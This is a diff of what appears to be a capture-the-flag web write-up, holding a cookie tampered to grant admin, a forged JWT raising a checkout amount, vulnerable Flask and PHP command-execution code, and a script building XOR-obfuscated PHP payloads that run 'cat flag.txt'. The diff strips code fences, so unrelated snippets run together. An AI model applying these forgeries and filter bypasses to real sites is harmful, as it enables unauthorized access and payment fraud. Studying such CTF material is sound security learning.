@@ -6,19 +6,9 @@
 
 ```
 Set-Cookie: cookie=eyJhZG1pbiI6MH0%3D; Path=/
-```
-
-
-
-```
 GET / HTTP/2
 Host: ch23900160354.ch.eng.run
 Cookie: cookie=eyJhZG1pbiI6MX0%3D
-```
-
-
-
-```
 @app.get('/')
 def index():
  test = request.args.get('test', None)
@@ -29,30 +19,15 @@ def index():
 
  try:
  output = os.popen(command).read()
-```
-
-
-
-```
 POST /buy HTTP/2
 Host: ch11900160369.ch.eng.run
 Content-Length: 12
 Content-Type: application/x-www-form-urlencoded
 
 product_id=4
-```
-
-
-
-```
 GET /checkout HTTP/2
 Host: ch11900160369.ch.eng.run
 Cookie: shopping_token=eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9.eyJhbW91bnQiOiA1MDAwfQ.qdH04CeYzu_qZoL2gBNdEsmtc3XKME6wAFw7CdjId5E
-```
-
-
-
-```
 <?php
 highlight_file(__FILE__);
 $command = $_GET['command'] ?? '';
@@ -76,14 +51,9 @@ if(filter($command)) {
 }
 echo "\n";
 ?>
-```
-
-
-
-```
 # ref: https://github.com/vichhika/CTF-Writeup/blob/main/GrabCON%20CTF%202021/Web/Basic%20Calc/README.md
 
-#string_code = ['system','ls'] # -> ("111114"^"BHBETY")("41"^"XB")
+    #string_code = ['system','ls'] # -> ("111114"^"BHBETY")("41"^"XB")
 string_code = ['system','cat flag.txt'] # -> ("111114"^"BHBETY")("111q1411w111"^"RPEQWXPVYEIE")
 obfuscated_code = ""
 charset = "1234567890qwertyuiopdfghjklzxvbnmQWERTYUIOPDFGHJKLZXVBNM"
